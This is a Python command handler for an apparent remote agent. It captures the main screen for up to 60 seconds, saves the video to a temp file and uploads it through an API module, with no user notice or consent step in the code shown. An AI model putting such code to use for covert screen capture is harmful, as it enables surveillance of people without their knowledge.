import os
import time
import tempfile
import logging

logger = logging.getLogger("agent.recording")


async def execute_record_screen(cmd_type: str, args: dict) -> dict:
    duration = int(args.get("duration", 10))
    duration = min(max(duration, 1), 60)

    try:
        import mss
        import cv2
        import numpy as np

        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, "recording.avi")

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width = monitor["width"]
            height = monitor["height"]

            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            out = cv2.VideoWriter(file_path, fourcc, 10.0, (width, height))

            start_time = time.time()
            while time.time() - start_time < duration:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)

            out.release()

        from api import api
        await api.upload_file(file_path, "recording.avi", file_type="video")

        return {"message": f"Recording saved ({duration}s)", "data": {"file_path": file_path}}

    except ImportError:
        return {"message": "Required: pip install mss opencv-python numpy"}
    except Exception as e:
        logger.error(f"Recording failed: {e}")
        return {"message": f"Recording failed: {str(e)}"}
